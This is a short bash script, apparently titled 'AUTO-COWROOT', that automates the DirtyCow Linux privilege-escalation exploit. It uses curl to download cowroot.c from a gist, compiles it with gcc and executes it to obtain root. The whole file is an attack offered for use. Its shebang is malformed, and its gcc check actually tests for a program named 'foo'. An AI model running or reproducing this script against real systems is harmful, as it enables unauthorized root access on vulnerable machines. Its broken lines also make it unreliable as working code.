!#bin/bash
set -x                                                                             

# if local program 'foo' returns 1 (doesn't exist) then...                                                                               
if ! type -P foo; then                                                             
    echo 'crap, no gcc, exiting'
    exit 1
else                                                                               
    echo 'sweet, we already have gcc'                                                    
fi    
echo 'AUTO-COWROOT'
echo 'Getting DirtyCow'
curl https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c -o dirtycow.c
echo 'Compiling DirtyCow'
gcc -pthread dirtycow.c -o cow
echo 'DirtyCow Compiled!'
echo 'Getting permissions...'
chmod +x cow
echo 'Executing DirtyCow...'
./cow